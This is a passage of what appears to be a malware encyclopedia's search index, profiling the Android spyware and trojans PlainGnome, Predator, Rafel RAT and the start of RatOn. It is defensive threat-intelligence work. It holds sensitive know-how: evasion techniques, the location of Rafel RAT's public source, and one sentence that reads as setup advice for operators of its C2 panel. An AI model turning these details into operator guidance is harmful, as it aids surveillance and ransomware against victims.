detection before deploying the second stage, and exfiltrates data only when the device enters an idle state using Android's Jetpack WorkManager. A stealth-optimized audio recording mode activates only when the device screen is off, avoiding the microphone indicator that newer Android versions display in the status bar. Active since 2024, PlainGnome targets Russian-speaking victims in Central Asian former Soviet states.</p>"},{"location":"malware/families/plaingnome/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2024 Last Seen Active as of December 2024 Status Active Type Surveillanceware Attribution Originally Gamaredon (FSB-linked); reattributed to Sandcat (Uzbekistan SSS) Aliases None known Lineage Custom-built, no known open-source foundation Distribution Social engineering, fake utility apps Related BoneSpy (companion family by same operator)"},{"location":"malware/families/plaingnome/#capabilities","title":"Capabilities","text":"Capability Details SMS collection Harvests all SMS messages Call logs Extracts call history Phone call audio Records voice calls Contacts Exfiltrates device contact list GPS location Tracks device coordinates Camera capture Takes photos via device cameras Ambient audio Records microphone audio with screen-off stealth mode Browser history Collects browsing data Notifications Intercepts and reads notifications Screenshots Captures device screen Cellular provider info Collects SIM and carrier details File access Browses and exfiltrates files from storage"},{"location":"malware/families/plaingnome/#screen-off-audio-recording","title":"Screen-Off Audio Recording","text":"<p>PlainGnome implements two ambient audio recording modes:</p> <ol> <li>Screen-off only - recording automatically stops when the device screen activates</li> <li>Continuous - records regardless of screen state</li> </ol> <p>The screen-off mode exists because Android 12 and later display a microphone icon in the status bar when any application accesses the microphone. By restricting recording to periods when the screen is off, the operator avoids the indicator being visible to the device owner. This represents a direct adaptation to Android's privacy transparency features.</p>"},{"location":"malware/families/plaingnome/#idle-state-exfiltration","title":"Idle-State Exfiltration","text":"<p>PlainGnome uses Android's Jetpack WorkManager API to schedule data exfiltration only when the device enters an idle state. This reduces network activity during periods of active user engagement, lowering the chance of the victim noticing unusual battery drain or data usage associated with upload operations.</p>"},{"location":"malware/families/plaingnome/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/plaingnome/#two-stage-dropper-architecture","title":"Two-Stage Dropper Architecture","text":"<p>PlainGnome's deployment separates the dropper from the surveillance payload:</p> Stage Role First stage (dropper) Minimal APK that presents itself as a utility app; requests <code>REQUEST_INSTALL_PACKAGES</code> permission; deploys second stage Second stage (payload) Full surveillance module stored within the dropper package; installed after anti-analysis checks pass <p>This two-stage design offers operational advantages over BoneSpy's single-stage approach. The dropper can present a benign appearance during initial analysis, and the surveillance payload is only deployed after the environment has been validated. If the dropper detects an emulator or analysis sandbox, it never drops the payload, shielding the actual surveillance capabilities from researcher inspection.</p>"},{"location":"malware/families/plaingnome/#emulator-detection","title":"Emulator Detection","text":"<p>Before deploying the second-stage payload, PlainGnome checks whether it is running on an emulator. This targets automated analysis sandboxes and manual researcher environments. If emulation is detected, the dropper does not install the surveillance module, preventing capability exposure in controlled analysis settings.</p>"},{"location":"malware/families/plaingnome/#no-code-obfuscation","title":"No Code Obfuscation","text":"<p>Despite the sophistication of its two-stage architecture and anti-analysis checks, PlainGnome does not employ code obfuscation. Once a researcher obtains the second-stage payload (by running the dropper on a physical device or bypassing emulator detection), the surveillance code is fully readable, a notable gap in the tool's operational security.</p>"},{"location":"malware/families/plaingnome/#custom-codebase","title":"Custom Codebase","text":"<p>PlainGnome does not share code lineage with DroidWatcher or any other known open-source surveillance project. While it implements a similar capability set to BoneSpy, the implementation is original. This likely reflects an intentional progression by the operators: BoneSpy served as the initial capability (leveraging existing code for rapid deployment), while PlainGnome represents a custom follow-on tool built to address the limitations of using a known open-source codebase.</p>"},{"location":"malware/families/plaingnome/#distribution","title":"Distribution","text":"<p>PlainGnome has never been observed on Google Play. Distribution is suspected to involve targeted social engineering, with lures including:</p> Lure Type Details Battery charge monitoring Fake utility apps for battery management Photo gallery apps Disguised as photo gallery applications Fake Samsung Knox Impersonates Samsung's enterprise security platform Trojanized Telegram Fully functional Telegram app bundled with surveillance capabilities <p>The exact delivery mechanism (phishing links, direct messages, watering holes) remains unclear. The targeting of Russian-speaking populations in Central Asia suggests distribution through Russian-language social channels and messaging platforms.</p>"},{"location":"malware/families/plaingnome/#target-regions","title":"Target Regions","text":"Region Details Uzbekistan Primary target Kazakhstan Secondary target Tajikistan Secondary target Kyrgyzstan Secondary target <p>The targeting mirrors BoneSpy's victim profile: Russian-speaking individuals in Central Asian former Soviet states. Given the reattribution to Sandcat (Uzbekistan SSS), this targeting pattern aligns with Uzbekistan's intelligence priorities in its immediate neighborhood.</p>"},{"location":"malware/families/plaingnome/#attribution","title":"Attribution","text":"<p>Lookout initially attributed PlainGnome to Gamaredon based on dynamic DNS provider usage and IP address overlaps with known Gamaredon desktop campaign infrastructure. This was later corrected to Sandcat, a threat actor linked to Uzbekistan's State Security Service, first identified in 2019. The reattribution reflects additional evidence that distinguished the mobile campaign infrastructure from Gamaredon's operations. The operational pairing of PlainGnome with BoneSpy under a single threat actor demonstrates a clear evolution in mobile surveillance capability: from an open-source foundation (BoneSpy/DroidWatcher) to a custom-built tool (PlainGnome) with anti-analysis protections and stealth optimizations.</p>"},{"location":"malware/families/plaingnome/#related-families","title":"Related Families","text":"Family Relationship BoneSpy Companion family by the same operator. BoneSpy is derived from DroidWatcher and uses a single-stage architecture. PlainGnome is custom-built with a two-stage dropper and more advanced anti-analysis features. Both share the same targeting profile and operator. GuardZoo Both are state-linked mobile surveillance tools targeting specific regional populations. GuardZoo targets Middle Eastern military personnel for Houthi-aligned intelligence, while PlainGnome targets Central Asian civilians and government figures for Uzbekistan's SSS. Both operate through social engineering rather than exploit chains. KoSpy Both use anti-analysis measures (emulator detection) and target specific language communities. KoSpy uses a Firebase Firestore first-stage for C2 configuration delivery, while PlainGnome uses a dropper APK for staged deployment. Both were disclosed by Lookout."},{"location":"malware/families/plaingnome/#references","title":"References","text":"<ul> <li>Lookout: BoneSpy and PlainGnome Android Surveillance</li> <li>The Hacker News: Gamaredon Deploys Android Spyware BoneSpy and PlainGnome</li> <li>BleepingComputer: Russian cyberspies target Android users with new spyware</li> <li>Security Affairs: First mobile malware families linked to Gamaredon</li> <li>SecurityOnline: Gamaredon APT Deploys Two Russian Android Spyware Families</li> <li>Infosecurity Magazine: Lookout Discovers New Spyware Deployed by Russia and China</li> </ul>"},{"location":"malware/families/predator/","title":"Predator","text":"<p>Predator is a mercenary spyware platform developed by Cytrox and operated under the Intellexa alliance, a consortium of European surveillance companies assembled to compete with NSO Group. Unlike Pegasus, which relies on proprietary zero-click exploits, Predator is typically delivered through one-click exploit chains targeting Chrome and Android kernel vulnerabilities. Its architecture splits responsibilities between an initial loader called Alien and the main implant Predator, which runs a Python-based module system for flexible surveillance tasking. Predator has been deployed against journalists, politicians, and academics across at least 25 countries.</p>"},{"location":"malware/families/predator/#overview","title":"Overview","text":"Attribute Details First Seen 2019 (estimated development start), December 2021 (first public documentation) Status Active, despite U.S. sanctions on Intellexa Type Commercial spyware (government-exclusive) Attribution Cytrox (North Macedonia), part of the Intellexa alliance led by Tal Dilian Aliases Predator, PREDATOR (Talos convention) Loader Alien Platforms Android (primary), iOS"},{"location":"malware/families/predator/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cytrox was founded in North Macedonia and later acquired into the Intellexa alliance, a group of companies including Nexa Technologies (formerly Amesys, France), WiSpear/Passitora Ltd. (Cyprus), and Senpai Technologies (Israel). Tal Dilian, an ex-Israeli Defense Forces intelligence officer, assembled this consortium with the explicit goal of building an EU-regulated competitor to NSO Group.</p> <p>Citizen Lab first publicly documented Predator in December 2021 when they discovered it on the iPhone of Ayman Nour, an Egyptian opposition politician living in exile in Turkey. Notably, Nour's device was infected with both Pegasus and Predator simultaneously by two separate government clients, making it the first known case of dual commercial spyware infection.</p>"},{"location":"malware/families/predator/#distribution","title":"Distribution","text":"<p>Predator delivery relies on one-click exploit chains and social engineering rather than zero-click capabilities.</p>"},{"location":"malware/families/predator/#exploit-chain-delivery","title":"Exploit Chain Delivery","text":"<p>Google TAG documented three campaigns in May 2022 where Predator was deployed using five zero-day vulnerabilities:</p> CVE Component Type CVE-2021-37973 Chrome (use-after-free in Portals) 0-day CVE-2021-37976 Chrome (info leak in core) 0-day CVE-2021-38000 Chrome (insufficient validation in Intents) 0-day CVE-2021-38003 Chrome (type confusion in V8) 0-day CVE-2021-1048 Android kernel (use-after-free) 0-day <p>The attack flow:</p> <ol> <li>Target receives a spear-phishing email containing a one-time link disguised as a URL shortener</li> <li>Clicking redirects through the exploit server, which chains Chrome RCE with an Android kernel privilege escalation</li> <li>The Alien loader is dropped onto the device</li> <li>Alien downloads and executes the Predator implant</li> <li>The target is redirected to a legitimate website to avoid suspicion</li> </ol> <p>Google TAG noted that these campaigns targeted tens of users per operation across Egypt, Armenia, Greece, Madagascar, Indonesia, Serbia, and Spain. The exploit chains also used n-day exploits alongside zero-days, exploiting the gap between when patches are released and when they reach end-user devices.</p>"},{"location":"malware/families/predator/#one-click-link-delivery","title":"One-Click Link Delivery","text":"<p>In the Greek surveillance scandal, targets received links via SMS or messaging apps that led to exploit pages. Citizen Lab confirmed Predator infections on the devices of journalist Thanasis Koukakis and PASOK party leader Nikos Androulakis. In some cases, links were distributed through social media, including posts on Twitter/X containing malicious URLs.</p>"},{"location":"malware/families/predator/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/predator/#alien-loader","title":"Alien Loader","text":"<p>Alien is far more than a simple dropper. Cisco Talos published an in-depth technical analysis revealing that Alien provides foundational capabilities that Predator depends on:</p> Capability Implementation Process injection Loaded into the <code>zygote64</code> process, giving it access to every Android application IPC hooking Hooks <code>ioctl()</code> in <code>libbinder.so</code> to intercept inter-process communication across the Android framework SELinux bypass Operates within the privileged <code>zygote</code> SELinux context Module delivery Downloads and loads Predator and additional modules from C2 Audio recording Low-level audio capture implemented at the Alien layer"},{"location":"malware/families/predator/#predator-implant","title":"Predator Implant","text":"<p>Predator itself runs a Python runtime environment, making it highly modular. New surveillance capabilities can be deployed as Python modules without requiring re-exploitation of the target device.</p> Capability Details Call recording Record voice calls and VoIP conversations Messaging app access Extract data from WhatsApp, Signal, Telegram Camera Activate front and rear cameras Microphone Ambient audio recording Location GPS and network-based tracking Certificate injection Install custom CA certificates into the user trust store, enabling MITM of TLS traffic App hiding Conceal applications or prevent their execution Arbitrary code execution Load and execute Python modules on demand from C2"},{"location":"malware/families/predator/#unknown-modules","title":"Unknown Modules","text":"<p>Talos identified references to two modules they could not obtain for analysis:</p> Module Suspected Function <code>tcore</code> Main surveillance orchestration component <code>kmem</code> Kernel memory access for privilege escalation"},{"location":"malware/families/predator/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/predator/#architecture","title":"Architecture","text":"<p>The Alien + Predator split serves an operational purpose: Alien handles the low-level Android integration (process injection, IPC hooking, SELinux context), while Predator provides the high-level surveillance logic through Python. This separation means Alien needs to be tightly coupled to the target Android version, while Predator modules remain portable.</p>"},{"location":"malware/families/predator/#persistence","title":"Persistence","text":"<p>Predator achieves persistence through Alien's injection into <code>zygote64</code>. Since Zygote is the parent process from which all Android applications fork, Alien persists as long as the system is running. On reboot, the persistence mechanism reinstalls the loader.</p>"},{"location":"malware/families/predator/#tls-interception","title":"TLS Interception","text":"<p>One of Predator's more aggressive capabilities is certificate poisoning. By injecting custom CA certificates into the user certificate store, Predator can perform man-in-the-middle attacks on HTTPS connections. This allows the operator to intercept encrypted communications from apps that do not implement certificate pinning.</p>"},{"location":"malware/families/predator/#c2-communication","title":"C2 Communication","text":"<p>Predator uses HTTPS for C2 communication with multi-hop proxy infrastructure. Citizen Lab mapped suspected Predator C2 servers to operators in Armenia, Egypt, Greece, Indonesia, Madagascar, Oman, Saudi Arabia, and Serbia.</p>"},{"location":"malware/families/predator/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"Country Targets Source Egypt Ayman Nour (opposition politician), exiled journalist Citizen Lab, December 2021 Greece Journalist Thanasis Koukakis, PASOK leader Nikos Androulakis, other politicians CPJ, Citizen Lab Armenia Government-backed campaigns Google TAG Indonesia Government-backed campaigns Google TAG Madagascar Political targets Google TAG Serbia Journalists, civil society Google TAG Spain Political figures Google TAG United States U.S. Senator and Congressman (targeted via social media links) Citizen Lab, October 2023 European Union President of European Parliament, MEPs Citizen Lab, October 2023 Vietnam, Qatar, Congo, Kenya, and others Various Amnesty International Predator Files"},{"location":"malware/families/predator/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>December 2021: Citizen Lab publishes \"Pegasus vs. Predator\", the first public documentation of Predator. The report identifies Cytrox as the developer and reveals that Egyptian opposition figure Ayman Nour's phone was simultaneously infected with both Pegasus and Predator.</p> <p>May 2022: Google TAG reveals that Cytrox exploited five zero-day vulnerabilities (four in Chrome, one in Android kernel) across three campaigns targeting Android users in multiple countries. TAG attributes the exploit packaging to Cytrox. Project Zero's 2021 zero-day trend analysis noted a record 58 in-the-wild zero-days detected that year, with Cytrox/Predator attributed for five Android and Chrome zero-days.</p> <p>April 2022: CPJ reports that Greek journalist Thanasis Koukakis was surveilled with Predator from July to September 2021. The revelations trigger a political crisis in Greece, leading to the resignations of the Greek intelligence chief and the prime minister's chief of staff in August 2022.</p> <p>May 2023: Cisco Talos publishes \"Mercenary Mayhem\", the most detailed technical analysis of Predator and Alien to date. The report reveals the Python-based architecture, Zygote injection, IPC hooking, and TLS interception capabilities. Talos also publishes a companion piece mapping the Intellexa corporate structure.</p> <p>October 2023: The Predator Files investigation, a year-long collaboration between Amnesty International and European Investigative Collaborations (EIC), reveals that 25 countries purchased Intellexa products. Citizen Lab independently confirms Predator targeting of U.S. and EU elected officials and journalists through links distributed on Twitter/X.</p> <p>March 2024: The U.S. Treasury Department sanctions Intellexa and its founder Tal Dilian, along with associated entities, for developing and distributing commercial spyware used against Americans. Despite sanctions, reports indicate Intellexa continues to operate through restructured corporate entities.</p>"},{"location":"malware/families/predator/#references","title":"References","text":""},{"location":"malware/families/rafelrat/","title":"Rafel RAT","text":"<p>Rafel RAT is an open-source Android remote access trojan documented by Check Point Research in June 2024 after observing over 120 distinct campaigns leveraging the tool across multiple countries. Originally built for espionage, Rafel RAT has been adopted by a wide range of threat actors, from state-sponsored groups like APT-C-35 (DoNot Team) to financially motivated operators deploying its ransomware module. Its open-source availability, PHP-based C2 panel, and broad feature set covering data exfiltration, SMS theft, location tracking, file encryption, and device wiping make it one of the most widely deployed Android RATs in recent years.</p>"},{"location":"malware/families/rafelrat/#overview","title":"Overview","text":"Attribute Details First Seen Campaigns observed over approximately two years prior to June 2024 disclosure Status Active, open-source and widely available Type Remote access trojan, espionage, ransomware Attribution Multiple actors; notably APT-C-35 (DoNot Team), Iran-based ransomware operators Aliases Rafel, Rafel RAT Language Java (implant), PHP (C2 panel) Source Code Publicly available on GitHub (<code>swagkarna/Rafel-Rat</code> and forks) Distribution Social engineering, phishing via SMS/WhatsApp/Telegram, fake app lures"},{"location":"malware/families/rafelrat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Rafel RAT is written in Java with a PHP web panel for command and control. The source code is publicly hosted on GitHub, making it freely available for any threat actor to clone, modify, and deploy. This zero-cost, zero-barrier accessibility has driven adoption across an unusually broad spectrum of operators, from sophisticated espionage groups to opportunistic cybercriminals with minimal technical skill.</p> <p>Check Point Research collected samples and identified around 120 C2 servers supporting campaigns spanning approximately two years before the June 2024 disclosure. The tool's open-source nature means individual campaigns vary significantly in sophistication, targeting, and objectives. Some operators use Rafel RAT as a straightforward data exfiltration tool, while others have leveraged its ransomware module for extortion.</p> <p>Unlike commercial Malware-as-a-Service (MaaS) operations where a central developer maintains the codebase and sells access, Rafel RAT has no support infrastructure. Each operator is responsible for standing up their own C2 panel, customizing the implant, and handling distribution. This creates a highly fragmented ecosystem where dozens of independent campaigns run simultaneously with no coordination between them.</p>"},{"location":"malware/families/rafelrat/#apt-c-35-adoption","title":"APT-C-35 Adoption","text":"<p>APT-C-35 (DoNot Team), a South Asian threat group known for espionage operations primarily targeting Pakistan and neighboring countries, was identified by Check Point as one of the actors deploying Rafel RAT. DoNot Team's adoption of an open-source tool alongside their custom malware demonstrates how freely available RATs lower the cost of operations even for groups capable of developing their own tooling. Using a widely shared tool also provides attribution cover, since the same malware is in use by dozens of unrelated actors.</p>"},{"location":"malware/families/rafelrat/#distribution","title":"Distribution","text":"<p>Rafel RAT relies on social engineering to reach victims. The malware impersonates widely recognized applications including Instagram, WhatsApp, e-commerce platforms, antivirus programs, and device support apps. Operators distribute malicious APKs through phishing campaigns on WhatsApp, Telegram, and SMS, directing victims to download and install the fake application.</p> Vector Details Fake applications Disguised as Instagram, WhatsApp, e-commerce apps, antivirus tools, support utilities, banking apps Phishing messages Distributed via SMS, WhatsApp, and Telegram with links to malicious APKs Social engineering Victims manipulated into granting intrusive permissions post-installation Institutional impersonation Fake messages from banks, educational institutions, and IT departments <p>Zimperium documented campaigns using carefully crafted phishing emails disguised as urgent security alerts from banks, directing targets to fake login pages that also triggered the Rafel RAT download. Other campaigns impersonated corporate IT departments, urging employees to install \"critical security updates\" that were actually the implant.</p> <p>Because the builder is free and each operator handles their own distribution, the delivery channels are as varied as the actors. Some campaigns target specific organizations in specific countries; others cast a wide net with generic app lures.</p>"},{"location":"malware/families/rafelrat/#android-version-targeting","title":"Android Version Targeting","text":"<p>Over 87.5% of infected devices were running outdated Android versions that no longer receive security patches. Check Point's analysis of victim devices revealed a clear pattern: operators specifically benefit from the weakened security posture of end-of-life devices where the permission model provides fewer safeguards.</p> Android Version Share of Infections Notes Android 11 21.4% Most prevalent single version Android 5 (Lollipop) ~18% End-of-life, no security patches since 2018 Android 8 (Oreo) Third most common End-of-life Android 6-10 ~48% combined Almost half of all infections Android 12-13 12.5% Only fraction running supported versions <p>The malware is compatible with Android versions 5 through 12. On older versions, the runtime permission model is less restrictive, making it easier for the malware to obtain broad access without triggering the same level of user prompts present on newer Android releases. Devices running Android 5 and 6 lack scoped storage, runtime permission controls introduced in Android 6+ are less mature, and DeviceAdmin restrictions added in later versions are absent.</p>"},{"location":"malware/families/rafelrat/#device-manufacturers","title":"Device Manufacturers","text":"<p>Samsung devices comprised the largest share of victims, followed by Xiaomi, Vivo, and Huawei handsets. Google Pixel and Nexus devices also appeared among the infected population. The manufacturer distribution largely mirrors global Android market share rather than indicating specific vendor targeting.</p>"},{"location":"malware/families/rafelrat/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/rafelrat/#core-features","title":"Core Features","text":"Capability C2 Command Implementation SMS theft <code>sms_oku</code> Exfiltrates all SMS messages including 2FA codes to C2 Location tracking <code>location_tracker</code> Continuous live device location reporting Contact exfiltration Harvests the victim's full phone book Call log theft Extracts and exfiltrates call history Device info collection Gathers identifiers, locale, carrier, model, root status, battery, memory Installed app enumeration Lists all applications installed on the device File exfiltration Steals files from device storage Notification siphoning Intercepts and forwards notifications, capturing authentication codes SD card wipe Destructive capability to erase external storage Call log deletion Removes call history to cover tracks Screen lock <code>LockTheScreen</code> Locks device screen, rendering it unusable Ransomware <code>ransomware</code> AES encryption of files with lock screen manipulation Wallpaper manipulation Changes device wallpaper to display ransom note or custom message Device vibration Activates vibration, used alongside ransom delivery <p>On initial infection, the implant transmits a device fingerprint to the C2 server containing device identifiers, model, OS version, locale, country, carrier details, root status, battery level, and available memory. The C2 server then responds with commands to execute on the device.</p>"},{"location":"malware/families/rafelrat/#ransomware-module","title":"Ransomware Module","text":"<p>The ransomware capability is particularly notable because mobile ransomware remains uncommon compared to desktop variants. Check Point observed that approximately 10% of campaigns issued the ransomware command, indicating that while most operators use Rafel RAT for surveillance and data theft, a meaningful subset deploy it for extortion.</p> <p>The ransomware module operates in multiple stages:</p> <ol> <li>File encryption: Uses AES encryption with a pre-defined key to encrypt files on device storage</li> <li>Lock screen takeover: If DeviceAdmin privileges are granted, changes the device lock screen password to prevent victim access</li> <li>Wallpaper replacement: Changes the device wallpaper to display a ransom demand</li> <li>Ransom note delivery: Sends an SMS to the victim containing the ransom note and instructions</li> <li>Anti-recovery: If the victim attempts to revoke DeviceAdmin privileges, the module immediately changes the password and locks the screen</li> </ol> <p>The use of a pre-defined AES key rather than per-victim asymmetric encryption is a significant weakness. If the key is extracted from a sample (trivial given the open-source code), all files encrypted by that build can be decrypted. Operators who do not modify the default encryption key in the source code before building their payload leave their victims' files recoverable through static analysis of the APK.</p>"},{"location":"malware/families/rafelrat/#espionage-operations","title":"Espionage Operations","text":"<p>When used by APT-C-35, Rafel RAT functions as a comprehensive espionage platform. The combination of SMS theft, contact harvesting, location tracking, call log exfiltration, and notification interception provides full surveillance of the target's communications and movements. The ability to enumerate installed applications also enables operators to profile the target's device usage and identify additional collection opportunities.</p> <p>The espionage use case does not require the ransomware or destructive capabilities. Operators configure the implant to run silently, collecting and exfiltrating data without any visible indicator to the victim. This contrasts with the ransomware use case, where the operator deliberately makes the infection visible as part of the extortion.</p>"},{"location":"malware/families/rafelrat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/rafelrat/#c2-communication","title":"C2 Communication","text":"<p>Rafel RAT primarily uses HTTP(S) for command-and-control communication. The communication flow starts with the implant sending a device registration request containing the fingerprint data, then polling the C2 server for commands via a PHP endpoint (<code>commands.php</code>).</p> C2 Method Details HTTP(S) Primary channel; implant polls PHP-based panel for commands Discord API Alternative channel using Discord servers for receiving exfiltrated data and issuing commands PHP panel Web-based management interface with JSON file storage (no database required) <p>The C2 infrastructure is lightweight by design. The PHP panel runs on any standard web hosting that supports PHP, with no database dependency. All data storage uses JSON files, making deployment trivial but also limiting scalability for large botnets. Operators can deploy a functional C2 server by uploading the PHP files to any hosting provider and configuring the <code>login.php</code> credentials. The hosting should use HTTPS with a valid certificate to avoid triggering network-level warnings.</p> <p>The Discord API integration provides an alternative exfiltration channel. Operators can configure the implant to send stolen data to Discord servers and receive commands through Discord's messaging infrastructure. This abuses Discord's legitimate infrastructure as a C2 relay, making network-level blocking more difficult since Discord traffic is common on most networks.</p>"},{"location":"malware/families/rafelrat/#builder-and-panel","title":"Builder and Panel","text":"<p>The Rafel RAT builder allows operators to generate customized APKs without Android development knowledge. The configuration process involves:</p> Parameter Description C2 URL The WebPanel URL pointing to the operator's PHP panel App name Display name for the disguised application App icon Custom icon to impersonate a legitimate app Package name Android package identifier for the generated APK Permissions Which device permissions to request on install <p>The PHP panel provides a web dashboard where operators can view all connected devices, their status, device details, and issue commands individually or in bulk. Newer versions of the panel include extended functionality, though the core architecture remains the same lightweight PHP-with-JSON-storage design.</p>"},{"location":"malware/families/rafelrat/#deviceadmin-abuse","title":"DeviceAdmin Abuse","text":"<p>Rafel RAT requests DeviceAdmin privileges during installation, which if granted provide elevated control over the device. With DeviceAdmin access, the malware can change the lock screen password, lock the device remotely, and resist uninstallation by preventing the victim from revoking admin privileges. This is critical for the ransomware module, which uses DeviceAdmin to enforce the lock screen ransom note and prevent the victim from regaining device access without paying.</p> <p>On Android versions before 9 (Pie), DeviceAdmin provided broader capabilities and was harder to revoke. Starting with Android 9, Google began deprecating certain DeviceAdmin APIs and on Android 10+, DeviceAdmin can no longer reset screen lock passwords unless the device uses no current password or PIN. This means the ransomware lock screen capability is most effective on older Android versions, which aligns with the observed victim profile of 87.5% running Android 11 or below.</p>"},{"location":"malware/families/rafelrat/#persistence","title":"Persistence","text":"<p>The malware uses social engineering at install time to obtain broad permissions, and DeviceAdmin enrollment makes removal difficult without factory reset. On outdated Android versions (which represent over 87% of victims), the permission model provides fewer safeguards against granting these privileges. The implant also requests exemption from battery optimization to prevent the OS from killing background services, and adds itself to the battery optimization whitelist to maintain persistent background execution.</p>"},{"location":"malware/families/rafelrat/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Check Point identified approximately 120 C2 servers across the observed campaigns. The infrastructure is fragmented, with each operator running their own panel independently. The low cost of deploying a Rafel C2 panel (any PHP-capable hosting) means servers are disposable and frequently rotated.</p>"},{"location":"malware/families/rafelrat/#pakistan-government-website-compromise","title":"Pakistan Government Website Compromise","text":"<p>One of the more notable infrastructure findings involved a compromised Pakistani government website that had a Rafel web panel installed on it. The panel was installed on May 18, 2024, though traces of the compromise date back to April 2023. Infected devices were reporting to this government server as their C2. A hacker using the handle @LoaderCrazy announced the compromise on the Telegram channel @EgyptHackerTeam. Hosting C2 infrastructure on a compromised government domain provides the attacker with a trusted domain reputation and makes network-level blocking more difficult for defenders.</p>"},{"location":"malware/families/rafelrat/#target-regions","title":"Target Regions","text":"<p>Check Point identified campaigns spanning a wide geographic range, with some successfully targeting high-profile organizations in government and military sectors.</p> Region Countries North America United States (most targeted country) East Asia China (second most targeted) Southeast Asia Indonesia (third most targeted) Western Europe France, Germany, Italy South Asia India, Pakistan (overlapping with APT-C-35 operations) Eastern Europe Russia, Romania, Czechia Oceania Australia, New Zealand <p>The concentration of victims in the United States, China, and Indonesia reflects both the large Android user bases in those countries and the opportunistic nature of most campaigns. The South Asian targeting is more deliberate, overlapping with APT-C-35's known operational focus on Pakistan. The majority of victims appear to be individuals running outdated Android devices, though government and military personnel were also among the compromised targets.</p>"},{"location":"malware/families/rafelrat/#notable-campaigns","title":"Notable Campaigns","text":"<p>APT-C-35 espionage operations: Check Point identified campaigns attributed to APT-C-35 (DoNot Team), a South Asian espionage group known for targeting Pakistan's government and military. DoNot Team's adoption of an open-source tool alongside their custom malware demonstrates how freely available RATs reduce operational costs and provide attribution cover even for sophisticated actors. The group used Rafel RAT for intelligence collection, leveraging the full surveillance suite of SMS interception, location tracking, contact harvesting, and notification siphoning.</p> <p>Iran-based ransomware campaign: An operator likely originating from Iran deployed Rafel RAT's ransomware module against victims in Pakistan. The attacker followed a two-phase approach: first executing standard information-gathering commands to profile the victim, then transitioning to ransomware. The campaign wiped call history, changed the device wallpaper to a custom ransom demand, locked the screen, activated device vibration, and sent an SMS ransom note written in Arabic instructing the victim to contact them via a Telegram channel. This represents one of the more brazen documented uses of mobile ransomware in the wild.</p> <p>Pakistan government server compromise: A threat actor operating under the handle @LoaderCrazy compromised a Pakistani government website and installed a Rafel C2 panel on it, with infected devices from multiple countries (United States, Russia, China, Romania) reporting to the government server. The compromise was announced on the Telegram channel @EgyptHackerTeam. The panel installation was traced to May 2024, with earlier indicators of compromise dating to April 2023.</p> <p>June 2024 disclosure: Check Point Research published comprehensive analysis documenting approximately 120 campaigns, around 120 C2 servers, and samples spanning multiple countries and threat actor profiles. The Hacker News, BleepingComputer, and Bitdefender published follow-up analyses. The report highlighted the convergence of espionage and ransomware operations within a single open-source tool, drawing significant industry attention to the threat posed by freely available mobile malware.</p>"},{"location":"malware/families/rafelrat/#comparison-to-other-open-source-android-rats","title":"Comparison to Other Open-Source Android RATs","text":"<p>Rafel RAT exists in an ecosystem of open-source Android RATs, each with different capabilities and adoption profiles.</p> RAT Language C2 Type Ransomware Builder GUI Key Differentiator Rafel RAT Java + PHP PHP web panel (JSON) Yes Web-based config Ransomware module, widest documented deployment SpyNote Java Custom TCP No Windows desktop VNC-like remote control, banking trojan extensions post-leak AhMyth Java + Electron Electron desktop panel No Desktop GUI Simplest setup, most bugs, limited to basic RAT functions DroidJack Java Custom protocol No Windows desktop Discontinued but still circulated, was commercially sold AndroRAT Java Java desktop No Desktop GUI One of the earliest Android RATs (2012), largely obsolete <p>Rafel RAT's distinguishing characteristics are the ransomware module (unique among widely deployed open-source Android RATs), the web-based PHP panel (no desktop client needed, deployable on any hosting), and the sheer scale of documented adoption. SpyNote surpasses Rafel RAT in raw capability with its VNC-like screen streaming and banking trojan overlays, but Rafel RAT's simpler architecture and web-based panel lower the barrier for operators with minimal infrastructure.</p> <p>The open-source model contrasts sharply with MaaS operations like Hook, Octo, and Cerberus, which provide polished panels, customer support, and regular updates in exchange for monthly fees. Rafel RAT offers no support, no updates beyond community forks, and no quality control. The tradeoff is zero cost and zero operational security risk from interacting with underground marketplace vendors.</p>"},{"location":"malware/families/rafelrat/#related-families","title":"Related Families","text":"<p>The ransomware capability sets Rafel RAT apart from most Android banking trojans. While families like Brata include destructive device wipe features as anti-forensics measures, Rafel RAT's ransomware module is designed for extortion with file encryption, ransom notes, and lock screen manipulation.</p> <p>As an espionage tool used by APT-C-35, Rafel RAT operates in the same category as SpyNote, another Android RAT frequently used by threat actors for surveillance operations. Both provide comprehensive device monitoring capabilities, though SpyNote is typically deployed in more targeted operations and has evolved into a banking trojan with overlay capabilities. Rafel RAT's open-source nature has enabled broader, less discriminate campaigns.</p> <p>GuardZoo, another Android surveillance tool targeting military personnel in the Middle East, shares operational similarities with Rafel RAT's espionage deployments. Both target government and military personnel in the same geographic regions, though GuardZoo is more narrowly focused while Rafel RAT's operator base spans from espionage to ransomware.</p>"},{"location":"malware/families/rafelrat/#references","title":"References","text":"<ul> <li>Check Point Research - Rafel RAT, Android Malware from Espionage to Ransomware Operations (June 2024)</li> <li>BleepingComputer - Rafel RAT targets outdated Android phones in ransomware attacks (June 2024)</li> <li>The Hacker News - Multiple Threat Actors Deploying Open-Source Rafel RAT (June 2024)</li> <li>Bitdefender - Rafel RAT: A Pest Invading Droid Systems (July 2024)</li> <li>Zimperium - Phishing Campaigns and Rafel RAT: A Dangerous Duo (2024)</li> <li>Zimperium - Unmasking Rafel RAT: Android Infiltration Campaign (2024)</li> <li>Security Affairs - 120 malicious campaigns using Rafel RAT (June 2024)</li> </ul>"},{"location":"malware/families/raton/","title":"RatOn","text":"<p>RatOn is an Android banking trojan that combines NFC relay attacks with ATS (Automated Transfer System) capabilities, making it the first known family to merge these two fraud techniques into a single platform. Discovered by ThreatFabric in September 2025, the malware evolved from a basic NFC relay tool into a sophisticated RAT with crypto wallet seed phrase extraction. It initially targets Czech Republic banking customers and has expanded into Slovakia, building on the NFC relay research first demonstrated by ESET's analysis of NGate.</p>"},{"location":"malware/families/raton/#overview","title":"Overview","text":"Attribute Details First Seen July 5, 2025 Status Active Type Banking trojan, NFC relay, ATS, RAT Attribution Unknown Distribution Fake 